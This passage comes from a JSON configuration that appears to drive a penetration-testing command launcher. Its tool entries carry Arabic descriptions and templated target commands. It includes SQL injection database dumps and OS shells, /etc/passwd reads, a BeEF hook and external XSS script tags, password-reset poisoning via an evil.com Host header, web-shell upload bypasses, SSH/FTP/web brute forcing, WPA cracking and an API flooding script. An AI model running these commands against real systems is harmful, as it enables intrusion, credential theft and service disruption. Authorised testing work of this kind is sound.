        "description": "تصور مخطط GraphQL",
        "commands": [
          "graphql-voyager {{URL}}/graphql"
        ]
      },
      {
        "name": "Postman Collection",
        "description": "توليد مجموعة Postman",
        "commands": [
          "newman run collection.json -e {{TARGET}}-env.json -r cli,json --reporter-json-export postman-{{TARGET}}.json"
        ]
      },
      {
        "name": "REST API Fuzzer",
        "description": "تخمين endpoints API",
        "commands": [
          "ffuf -u {{URL}}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,202 -o api-fuzz-{{TARGET}}.json"
        ]
      },
      {
        "name": "Arjun - API Parameters",
        "description": "معاملات API",
        "commands": [
          "arjun -u {{URL}}/api/v1 -m GET,POST -o arjun-api-{{TARGET}}.json"
        ]
      },
      {
        "name": "Kiterunner",
        "description": "اكتشاف API",
        "commands": [
          "kr scan {{URL}} -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -o kiterunner-{{TARGET}}.txt"
        ]
      },
      {
        "name": "API Fuzzer",
        "description": "تخمين API شامل",
        "commands": [
          "python3 API-fuzzer.py -u {{URL}}/api -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt | tee api-fuzzer-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "vulnerability-scanning",
    "title": "Vulnerability Scanning",
    "titleAr": "فحص الثغرات الأمنية",
    "tools": [
      {
        "name": "Nikto - Web Scanner",
        "description": "فحص ثغرات الويب",
        "commands": [
          "nikto -h {{URL}} -o nikto-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Nikto - All Plugins",
        "description": "جميع الإضافات",
        "commands": [
          "nikto -h {{URL}} -Plugins '@@ALL' -o nikto-all-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Arachni",
        "description": "ماسح ثغرات ويب شامل",
        "commands": [
          "arachni {{URL}} --report-save-path=arachni-{{TARGET}}.afr"
        ]
      },
      {
        "name": "ZAP Baseline",
        "description": "فحص OWASP ZAP أساسي",
        "commands": [
          "zap-baseline.py -t {{URL}} -r zap-baseline-{{TARGET}}.html"
        ]
      },
      {
        "name": "ZAP Full Scan",
        "description": "فحص ZAP شامل",
        "commands": [
          "zap-full-scan.py -t {{URL}} -r zap-full-{{TARGET}}.html"
        ]
      },
      {
        "name": "Burp Suite Scanner",
        "description": "فحص Burp Suite",
        "commands": [
          "burp-rest-api scan --url {{URL}} --output burp-{{TARGET}}.xml"
        ]
      },
      {
        "name": "Wapiti",
        "description": "ماسح ثغرات",
        "commands": [
          "wapiti -u {{URL}} -f txt -o wapiti-{{TARGET}}"
        ]
      },
      {
        "name": "W3af",
        "description": "إطار عمل فحص الويب",
        "commands": [
          "w3af_console -s w3af-script.w3af -t {{URL}} | tee w3af-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Acunetix",
        "description": "فحص Acunetix",
        "commands": [
          "acunetix-cli scan {{URL}} -o acunetix-{{TARGET}}.xml"
        ]
      }
    ]
  },
  {
    "id": "network-recon",
    "title": "Network Reconnaissance",
    "titleAr": "استطلاع الشبكة",
    "tools": [
      {
        "name": "Ping Sweep",
        "description": "مسح الشبكة",
        "commands": [
          "nmap -sn 192.168.1.0/24 -oN ping-sweep-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Traceroute",
        "description": "تتبع المسار",
        "commands": [
          "traceroute {{TARGET}} | tee traceroute-{{TARGET}}.txt"
        ]
      },
      {
        "name": "MTR - Network Diagnostic",
        "description": "تشخيص الشبكة",
        "commands": [
          "mtr {{TARGET}} -r -c 10 | tee mtr-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Netcat - Banner Grab",
        "description": "جمع معلومات الخدمة",
        "commands": [
          "nc -v {{TARGET}} 80 | tee nc-banner-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Hping3 - TCP Probe",
        "description": "فحص TCP",
        "commands": [
          "hping3 -S {{TARGET}} -p 80 -c 10 | tee hping3-{{TARGET}}.txt"
        ]
      },
      {
        "name": "ARP Scan",
        "description": "فحص ARP",
        "commands": [
          "arp-scan --localnet | tee arp-scan-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "social-media",
    "title": "Social Media OSINT",
    "titleAr": "استخبارات وسائل التواصل الاجتماعي",
    "tools": [
      {
        "name": "Social Mapper",
        "description": "رسم خرائط وسائل التواصل",
        "commands": [
          "python3 social_mapper.py -f {{TARGET}} -m all -o socialmapper-{{TARGET}}"
        ]
      },
      {
        "name": "Sherlock",
        "description": "البحث عن أسماء مستخدمين",
        "commands": [
          "sherlock {{TARGET}} -o sherlock-{{TARGET}}.txt"
        ]
      },
      {
        "name": "WhatsMyName",
        "description": "تعداد أسماء المستخدمين",
        "commands": [
          "whatsmyname -u {{TARGET}} | tee whatsmyname-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Twint - Twitter OSINT",
        "description": "جمع من Twitter",
        "commands": [
          "twint -s {{TARGET}} -o twint-{{TARGET}}.txt"
        ]
      },
      {
        "name": "maigret",
        "description": "جمع معلومات من 2500+ موقع",
        "commands": [
          "maigret {{TARGET}} --html | tee maigret-{{TARGET}}.html"
        ]
      },
      {
        "name": "InstagramOSINT",
        "description": "جمع من Instagram",
        "commands": [
          "python3 instagram.py {{TARGET}} | tee instagram-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "web-attacks",
    "title": "Web Application Attacks",
    "titleAr": "هجمات تطبيقات الويب",
    "tools": [
      {
        "name": "XSStrike",
        "description": "كشف واستغلال XSS",
        "commands": [
          "python3 xsstrike.py -u {{URL}} --crawl | tee xsstrike-{{TARGET}}.txt"
        ]
      },
      {
        "name": "dalfox",
        "description": "ماسح XSS سريع",
        "commands": [
          "dalfox url {{URL}} -o dalfox-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SQLMap - Basic",
        "description": "فحص SQL Injection",
        "commands": [
          "sqlmap -u {{URL}} --batch --banner | tee sqlmap-basic-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SQLMap - Deep Scan",
        "description": "فحص عميق للحقن",
        "commands": [
          "sqlmap -u {{URL}} --batch --level=5 --risk=3 --dbs | tee sqlmap-deep-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SQLMap - Dump Database",
        "description": "استخراج قاعدة البيانات",
        "commands": [
          "sqlmap -u {{URL}} --batch --dump-all | tee sqlmap-dump-{{TARGET}}.txt"
        ]
      },
      {
        "name": "NoSQLMap",
        "description": "استغلال NoSQL Injection",
        "commands": [
          "python3 nosqlmap.py -t {{URL}} -a | tee nosqlmap-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Commix",
        "description": "Command Injection",
        "commands": [
          "commix --url={{URL}} --batch | tee commix-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SSRFmap",
        "description": "Server Side Request Forgery",
        "commands": [
          "python3 ssrfmap.py -r request.txt -p url | tee ssrfmap-{{TARGET}}.txt"
        ]
      },
      {
        "name": "XXEinjector",
        "description": "XXE Injection",
        "commands": [
          "ruby XXEinjector.rb --host={{TARGET}} --path=/ --file=/etc/passwd | tee xxe-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Gopherus",
        "description": "SSRF Payload Generator",
        "commands": [
          "python3 gopherus.py --exploit mysql | tee gopherus-{{TARGET}}.txt"
        ]
      },
      {
        "name": "LFISuite",
        "description": "Local File Inclusion",
        "commands": [
          "python3 lfisuite.py -u {{URL}} | tee lfisuite-{{TARGET}}.txt"
        ]
      },
      {
        "name": "dotdotpwn",
        "description": "Directory Traversal",
        "commands": [
          "dotdotpwn -m http -h {{TARGET}} -x 80 -f /etc/passwd | tee dotdotpwn-{{TARGET}}.txt"
        ]
      },
      {
        "name": "CRLF Injection",
        "description": "اختبار CRLF",
        "commands": [
          "python3 crlfuzz -u {{URL}} -o crlfuzz-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Template Injection",
        "description": "اختبار Template Injection",
        "commands": [
          "tplmap -u {{URL}} | tee tplmap-{{TARGET}}.txt"
        ]
      },
      {
        "name": "NoSQLi - Blind",
        "description": "NoSQL Injection أعمى",
        "commands": [
          "python3 nosqlmap.py -u {{URL}} --verb POST --cookie='session=xxx' | tee nosqlmap-blind-{{TARGET}}.txt"
        ]
      },
      {
        "name": "XSS - Reflected",
        "description": "XSS منعكس",
        "commands": [
          "python3 xsser --url {{URL}}?param=XSS -g | tee xsser-reflected-{{TARGET}}.txt"
        ]
      },
      {
        "name": "XSS - DOM Based",
        "description": "XSS مبني على DOM",
        "commands": [
          "dalfox url {{URL}} --mining-dom -o dalfox-dom-{{TARGET}}.txt"
        ]
      },
      {
        "name": "XSS - Stored",
        "description": "XSS مخزن",
        "commands": [
          "python3 xsstrike.py -u {{URL}} --data --fuzzer | tee xsstrike-stored-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Open Redirect",
        "description": "إعادة توجيه مفتوحة",
        "commands": [
          "python3 Oralyzer.py -u {{URL}} -p payloads.txt | tee oralyzer-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Host Header Injection",
        "description": "حقن Host Header",
        "commands": [
          "curl -H \"Host: evil.com\" {{URL}} -v | tee host-header-{{TARGET}}.txt"
        ]
      },
      {
        "name": "XML Injection",
        "description": "حقن XML",
        "commands": [
          "wfuzz -c -z file,/usr/share/seclists/Fuzzing/XML.txt --hc 404 -d \"xml=FUZZ\" {{URL}} | tee xml-injection-{{TARGET}}.txt"
        ]
      },
      {
        "name": "LDAP Injection",
        "description": "حقن LDAP",
        "commands": [
          "python3 ldapinjection.py -u {{URL}} | tee ldap-{{TARGET}}.txt"
        ]
      },
      {
        "name": "OAuth Misconfiguration",
        "description": "فحص OAuth",
        "commands": [
          "python3 oauth-scanner.py -u {{URL}} | tee oauth-{{TARGET}}.txt"
        ]
      },
      {
        "name": "JWT Attack",
        "description": "هجمات JWT",
        "commands": [
          "python3 jwt_tool.py {{URL}} -M at -t {{URL}} | tee jwt-attack-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Prototype Pollution",
        "description": "تلوث النموذج الأولي",
        "commands": [
          "ppmap -u {{URL}} | tee ppmap-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Race Condition",
        "description": "اختبار Race Condition",
        "commands": [
          "turbo-intruder {{URL}} race-condition.py | tee race-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Insecure Deserialization",
        "description": "إلغاء تسلسل غير آمن",
        "commands": [
          "ysoserial -p CommonsCollections5 -o base64 | tee ysoserial-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "xss-testing",
    "title": "XSS Testing (Advanced)",
    "titleAr": "اختبار XSS متقدم",
    "tools": [
      {
        "name": "XSStrike - Parameter Analysis",
        "description": "تحليل المعاملات",
        "commands": [
          "python3 xsstrike.py -u {{URL}}?param=test --params | tee xsstrike-params-{{TARGET}}.txt"
        ]
      },
      {
        "name": "XSStrike - Fuzzing",
        "description": "تخمين XSS",
        "commands": [
          "python3 xsstrike.py -u {{URL}} --fuzzer -t 20 | tee xsstrike-fuzz-{{TARGET}}.txt"
        ]
      },
      {
        "name": "dalfox - Blind XSS",
        "description": "XSS أعمى",
        "commands": [
          "dalfox url {{URL}} --blind https://your-xss-hunter.com | tee dalfox-blind-{{TARGET}}.txt"
        ]
      },
      {
        "name": "dalfox - Mining",
        "description": "استخراج معاملات",
        "commands": [
          "dalfox url {{URL}} --mining-dict --mining-dom -o dalfox-mining-{{TARGET}}.txt"
        ]
      },
      {
        "name": "XSS Hunter Payload",
        "description": "XSS Hunter",
        "commands": [
          "echo '<script src=https://xss.hunter></script>' | tee xss-hunter-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Beef Hook",
        "description": "BeEF Framework Hook",
        "commands": [
          "echo '<script src=\"http://beef-server:3000/hook.js\"></script>' | tee beef-{{TARGET}}.txt"
        ]
      },
      {
        "name": "XSS Polyglot",
        "description": "XSS متعدد السياقات",
        "commands": [
          "echo \"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\" | tee xss-polyglot-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Kxss",
        "description": "اكتشاف Reflected XSS",
        "commands": [
          "echo {{URL}} | kxss | tee kxss-{{TARGET}}.txt"
        ]
      },
      {
        "name": "XSpear",
        "description": "XSS Scanner متقدم",
        "commands": [
          "XSpear -u {{URL}}?param=test --crawl-and-hunt | tee xspear-{{TARGET}}.txt"
        ]
      },
      {
        "name": "BruteXSS",
        "description": "تخمين XSS",
        "commands": [
          "python3 brutexss.py -u {{URL}} -g | tee brutexss-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "sqli-testing",
    "title": "SQL Injection (Advanced)",
    "titleAr": "اختبار SQL Injection متقدم",
    "tools": [
      {
        "name": "SQLMap - Tamper Scripts",
        "description": "SQLMap مع Tamper",
        "commands": [
          "sqlmap -u {{URL}} --tamper=space2comment,between --batch | tee sqlmap-tamper-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SQLMap - WAF Bypass",
        "description": "تجاوز WAF",
        "commands": [
          "sqlmap -u {{URL}} --random-agent --tamper=apostrophemask,space2comment,charencode --level=5 --risk=3 | tee sqlmap-waf-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SQLMap - Time Based",
        "description": "Time-based Blind",
        "commands": [
          "sqlmap -u {{URL}} --technique=T --time-sec=5 --batch | tee sqlmap-time-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SQLMap - Union Based",
        "description": "Union-based",
        "commands": [
          "sqlmap -u {{URL}} --technique=U --union-cols=10 --batch | tee sqlmap-union-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SQLMap - Error Based",
        "description": "Error-based",
        "commands": [
          "sqlmap -u {{URL}} --technique=E --batch | tee sqlmap-error-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SQLMap - Boolean Based",
        "description": "Boolean-based Blind",
        "commands": [
          "sqlmap -u {{URL}} --technique=B --batch | tee sqlmap-boolean-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SQLMap - OS Shell",
        "description": "الحصول على Shell",
        "commands": [
          "sqlmap -u {{URL}} --os-shell --batch | tee sqlmap-shell-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SQLMap - File Read",
        "description": "قراءة ملفات",
        "commands": [
          "sqlmap -u {{URL}} --file-read=/etc/passwd --batch | tee sqlmap-read-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SQLMap - Crawl",
        "description": "زحف وفحص",
        "commands": [
          "sqlmap -u {{URL}} --crawl=3 --batch | tee sqlmap-crawl-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Ghauri - SQLi",
        "description": "SQLi Tool متقدم",
        "commands": [
          "python3 ghauri.py -u {{URL}} --batch --dbs | tee ghauri-{{TARGET}}.txt"
        ]
      },
      {
        "name": "NoSQLMap - Advanced",
        "description": "NoSQL متقدم",
        "commands": [
          "python3 nosqlmap.py -u {{URL}} --attack 1,2,3,4 | tee nosqlmap-adv-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "auth-testing",
    "title": "Authentication Testing",
    "titleAr": "اختبار المصادقة",
    "tools": [
      {
        "name": "JWT None Algorithm",
        "description": "JWT None Attack",
        "commands": [
          "python3 jwt_tool.py TOKEN -X a | tee jwt-none-{{TARGET}}.txt"
        ]
      },
      {
        "name": "JWT Key Confusion",
        "description": "JWT Key Confusion",
        "commands": [
          "python3 jwt_tool.py TOKEN -X k -pk public.pem | tee jwt-confusion-{{TARGET}}.txt"
        ]
      },
      {
        "name": "JWT Crack Secret",
        "description": "كسر سر JWT",
        "commands": [
          "python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt | tee jwt-crack-{{TARGET}}.txt"
        ]
      },
      {
        "name": "2FA Bypass",
        "description": "تجاوز المصادقة الثنائية",
        "commands": [
          "python3 2fa-bypass.py -u {{URL}}/login -U users.txt | tee 2fa-bypass-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Password Reset Poisoning",
        "description": "تسميم إعادة تعيين كلمة المرور",
        "commands": [
          "curl -X POST {{URL}}/reset -H \"Host: evil.com\" -d \"email=victim@example.com\" | tee reset-poison-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Session Fixation",
        "description": "Session Fixation",
        "commands": [
          "curl -c cookies.txt {{URL}} && curl -b cookies.txt {{URL}}/login -d \"user=admin&pass=admin\" | tee session-fix-{{TARGET}}.txt"
        ]
      },
      {
        "name": "OAuth Token Theft",
        "description": "سرقة OAuth Token",
        "commands": [
          "python3 oauth-attack.py -u {{URL}}/oauth/authorize | tee oauth-theft-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SAML Injection",
        "description": "حقن SAML",
        "commands": [
          "python3 saml-raider.py -u {{URL}} | tee saml-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Bruteforce OTP",
        "description": "تخمين OTP",
        "commands": [
          "python3 otp-brute.py -u {{URL}}/verify-otp -l 6 | tee otp-brute-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Account Takeover",
        "description": "سيطرة على الحساب",
        "commands": [
          "python3 account-takeover.py -u {{URL}} | tee ato-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "session-testing",
    "title": "Session Management",
    "titleAr": "إدارة الجلسات",
    "tools": [
      {
        "name": "Session Cookie Analysis",
        "description": "تحليل Cookie",
        "commands": [
          "curl -I {{URL}}/login -c cookies.txt && cat cookies.txt | tee cookies-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Session Token Prediction",
        "description": "التنبؤ بـ Token",
        "commands": [
          "python3 session-predictor.py -u {{URL}} -n 100 | tee session-predict-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Session Timeout Test",
        "description": "اختبار انتهاء الجلسة",
        "commands": [
          "python3 session-timeout.py -u {{URL}} -t 3600 | tee session-timeout-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Cookie Security Flags",
        "description": "فحص أعلام الأمان",
        "commands": [
          "curl -I {{URL}} | grep -i \"set-cookie\" | tee cookie-flags-{{TARGET}}.txt"
        ]
      },
      {
        "name": "CSRF Token Bypass",
        "description": "تجاوز CSRF Token",
        "commands": [
          "python3 csrf-bypass.py -u {{URL}}/action | tee csrf-bypass-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Session Puzzling",
        "description": "Session Puzzling",
        "commands": [
          "python3 session-puzzle.py -u {{URL}} | tee session-puzzle-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "file-upload",
    "title": "File Upload Testing",
    "titleAr": "اختبار رفع الملفات",
    "tools": [
      {
        "name": "Fuxploider",
        "description": "File Upload Exploiter",
        "commands": [
          "python3 fuxploider.py --url {{URL}}/upload | tee fuxploider-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Upload Scanner",
        "description": "فحص رفع الملفات",
        "commands": [
          "python3 upload-scanner.py -u {{URL}}/upload | tee upload-scan-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Magic Bytes Bypass",
        "description": "تجاوز Magic Bytes",
        "commands": [
          "python3 magic-bypass.py -f shell.php -u {{URL}}/upload | tee magic-bypass-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Double Extension",
        "description": "امتداد مزدوج",
        "commands": [
          "curl -F \"file=@shell.php.jpg\" {{URL}}/upload | tee double-ext-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Null Byte Injection",
        "description": "حقن Null Byte",
        "commands": [
          "curl -F \"file=@shell.php%00.jpg\" {{URL}}/upload | tee null-byte-{{TARGET}}.txt"
        ]
      },
      {
        "name": "MIME Type Bypass",
        "description": "تجاوز MIME Type",
        "commands": [
          "curl -F \"file=@shell.php\" -H \"Content-Type: image/jpeg\" {{URL}}/upload | tee mime-bypass-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Polyglot File",
        "description": "ملف متعدد الاستخدامات",
        "commands": [
          "python3 polyglot-generator.py -o polyglot.jpg.php | tee polyglot-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "idor-testing",
    "title": "IDOR & Access Control",
    "titleAr": "IDOR والتحكم في الوصول",
    "tools": [
      {
        "name": "Autorize",
        "description": "اختبار Authorization",
        "commands": [
          "python3 autorize.py -u {{URL}} -c cookies.txt | tee autorize-{{TARGET}}.txt"
        ]
      },
      {
        "name": "IDOR Scanner",
        "description": "فحص IDOR",
        "commands": [
          "python3 idor-scanner.py -u {{URL}}/api/user/ID | tee idor-{{TARGET}}.txt"
        ]
      },
      {
        "name": "403 Bypass",
        "description": "تجاوز 403",
        "commands": [
          "bypass-403 {{URL}}/admin | tee bypass-403-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Path Traversal - Advanced",
        "description": "اجتياز مسار متقدم",
        "commands": [
          "ffuf -u {{URL}}/file?path=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt | tee path-traversal-{{TARGET}}.txt"
        ]
      },
      {
        "name": "403bypasser",
        "description": "أداة تجاوز 403",
        "commands": [
          "python3 403bypasser.py -u {{URL}}/admin -m all | tee 403bypasser-{{TARGET}}.txt"
        ]
      },
      {
        "name": "IIS Shortname Scanner",
        "description": "فحص IIS Shortname",
        "commands": [
          "java -jar iis_shortname_scanner.jar {{URL}} | tee iis-shortname-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "api-security",
    "title": "API Security Testing",
    "titleAr": "اختبار أمان API",
    "tools": [
      {
        "name": "API Fuzzer - Endpoints",
        "description": "تخمين Endpoints",
        "commands": [
          "ffuf -u {{URL}}/api/v1/FUZZ -w api-endpoints.txt -mc 200,201,301,401,403 | tee api-fuzz-{{TARGET}}.txt"
        ]
      },
      {
        "name": "API Rate Limit Test",
        "description": "اختبار حد المعدل",
        "commands": [
          "python3 rate-limit-test.py -u {{URL}}/api/login -n 1000 | tee rate-limit-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Mass Assignment",
        "description": "Mass Assignment",
        "commands": [
          "python3 mass-assignment.py -u {{URL}}/api/user -d '{\"role\":\"admin\"}' | tee mass-assign-{{TARGET}}.txt"
        ]
      },
      {
        "name": "API Version Enumeration",
        "description": "تعداد إصدارات API",
        "commands": [
          "ffuf -u {{URL}}/api/vFUZZ/users -w <(seq 1 10) | tee api-versions-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Broken Object Level Authorization",
        "description": "BOLA Test",
        "commands": [
          "python3 bola-test.py -u {{URL}}/api/user/ID | tee bola-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Excessive Data Exposure",
        "description": "كشف بيانات زائدة",
        "commands": [
          "curl {{URL}}/api/users -H \"Authorization: Bearer TOKEN\" | jq . | tee data-exposure-{{TARGET}}.json"
        ]
      },
      {
        "name": "Lack of Resources",
        "description": "نقص الموارد",
        "commands": [
          "python3 api-dos.py -u {{URL}}/api/search -p 'q=*' -n 10000 | tee api-dos-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "logic-testing",
    "title": "Business Logic Testing",
    "titleAr": "اختبار منطق العمل",
    "tools": [
      {
        "name": "Price Manipulation",
        "description": "التلاعب بالأسعار",
        "commands": [
          "curl -X POST {{URL}}/checkout -d '{\"price\":-100,\"item\":\"product\"}' | tee price-manip-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Coupon Bypass",
        "description": "تجاوز الكوبون",
        "commands": [
          "python3 coupon-bypass.py -u {{URL}}/apply-coupon | tee coupon-bypass-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Workflow Bypass",
        "description": "تجاوز سير العمل",
        "commands": [
          "python3 workflow-bypass.py -u {{URL}} | tee workflow-bypass-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Payment Gateway Test",
        "description": "اختبار بوابة الدفع",
        "commands": [
          "python3 payment-test.py -u {{URL}}/payment | tee payment-test-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Inventory Manipulation",
        "description": "التلاعب بالمخزون",
        "commands": [
          "curl -X POST {{URL}}/order -d '{\"quantity\":-10}' | tee inventory-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "password-attacks",
    "title": "Password & Authentication",
    "titleAr": "كلمات المرور والمصادقة",
    "tools": [
      {
        "name": "Hydra - HTTP Form",
        "description": "تخمين نماذج الويب",
        "commands": [
          "hydra -L users.txt -P passwords.txt {{TARGET}} http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\" -V | tee hydra-web-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Hydra - SSH",
        "description": "تخمين SSH",
        "commands": [
          "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {{TARGET}} ssh -V | tee hydra-ssh-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Hydra - FTP",
        "description": "تخمين FTP",
        "commands": [
          "hydra -L users.txt -P passwords.txt {{TARGET}} ftp -V | tee hydra-ftp-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Medusa - SSH",
        "description": "تخمين متعدد البروتوكولات",
        "commands": [
          "medusa -h {{TARGET}} -U users.txt -P passwords.txt -M ssh | tee medusa-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Patator - HTTP",
        "description": "محرك تخمين مرن",
        "commands": [
          "patator http_fuzz url={{URL}}/login method=POST body='user=FILE0&pass=FILE1' 0=users.txt 1=passwords.txt -x ignore:fgrep='Login failed' | tee patator-{{TARGET}}.txt"
        ]
      },
      {
        "name": "John the Ripper",
        "description": "كسر كلمات المرور",
        "commands": [
          "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt | tee john-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Hashcat - MD5",
        "description": "كسر MD5 بالـGPU",
        "commands": [
          "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o hashcat-{{TARGET}}.txt"
        ]
      },
      {
        "name": "CrackMapExec - SMB",
        "description": "تخمين Windows",
        "commands": [
          "crackmapexec smb {{TARGET}} -u users.txt -p passwords.txt | tee cme-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Brutespray",
        "description": "تخمين من Nmap",
        "commands": [
          "brutespray --file nmap-{{TARGET}}.gnmap -U users.txt -P passwords.txt | tee brutespray-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "database-scanning",
    "title": "Database Security",
    "titleAr": "أمان قواعد البيانات",
    "tools": [
      {
        "name": "Nmap - MySQL Enum",
        "description": "تعداد MySQL",
        "commands": [
          "nmap --script mysql-enum -p 3306 {{TARGET}} -oN mysql-enum-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Nmap - MongoDB",
        "description": "فحص MongoDB",
        "commands": [
          "nmap -p 27017 --script mongodb-databases,mongodb-info {{TARGET}} -oN mongo-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Nmap - PostgreSQL",
        "description": "تعداد PostgreSQL",
        "commands": [
          "nmap --script pgsql-brute -p 5432 {{TARGET}} -oN pgsql-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Redis - Info",
        "description": "معلومات Redis",
        "commands": [
          "redis-cli -h {{TARGET}} INFO | tee redis-info-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Nmap - MS SQL",
        "description": "فحص MS SQL Server",
        "commands": [
          "nmap --script ms-sql-info,ms-sql-config -p 1433 {{TARGET}} -oN mssql-{{TARGET}}.txt"
        ]
      },
      {
        "name": "NoSQLMap - MongoDB",
        "description": "استغلال MongoDB",
        "commands": [
          "python3 nosqlmap.py -t {{TARGET}}:27017 --scan | tee nosqlmap-mongo-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "wireless",
    "title": "Wireless Security",
    "titleAr": "أمان الشبكات اللاسلكية",
    "tools": [
      {
        "name": "airodump-ng",
        "description": "مراقبة شبكات WiFi",
        "commands": [
          "airodump-ng wlan0mon -w airodump-{{TARGET}}"
        ]
      },
      {
        "name": "aircrack-ng",
        "description": "كسر WPA/WPA2",
        "commands": [
          "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capture.cap"
        ]
      },
      {
        "name": "Reaver",
        "description": "هجوم WPS",
        "commands": [
          "reaver -i wlan0mon -b [BSSID] -vv | tee reaver-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Wifite",
        "description": "هجوم WiFi آلي",
        "commands": [
          "wifite --kill --wpa --dict /usr/share/wordlists/rockyou.txt | tee wifite-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Kismet",
        "description": "كاشف شبكات لاسلكية",
        "commands": [
          "kismet -c wlan0 | tee kismet-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Bettercap - WiFi",
        "description": "هجمات WiFi متقدمة",
        "commands": [
          "bettercap -iface wlan0 -eval \"wifi.recon on; wifi.show\" | tee bettercap-wifi-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "mobile-security",
    "title": "Mobile App Testing",
    "titleAr": "اختبار تطبيقات الجوال",
    "tools": [
      {
        "name": "MobSF",
        "description": "Mobile Security Framework",
        "commands": [
          "python3 mobsf.py | tee mobsf-{{TARGET}}.txt"
        ]
      },
      {
        "name": "APKTool",
        "description": "فك تجميع APK",
        "commands": [
          "apktool d app.apk -o apktool-output-{{TARGET}}"
        ]
      },
      {
        "name": "Jadx",
        "description": "تحويل APK لـ Java",
        "commands": [
          "jadx app.apk -d jadx-output-{{TARGET}}"
        ]
      },
      {
        "name": "Objection",
        "description": "Frida Runtime Hook",
        "commands": [
          "objection -g com.{{TARGET}}.app explore | tee objection-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Drozer",
        "description": "Android Security Assessment",
        "commands": [
          "drozer console connect | tee drozer-{{TARGET}}.txt"
        ]
      },
      {
        "name": "ADB - Package List",
        "description": "قائمة التطبيقات",
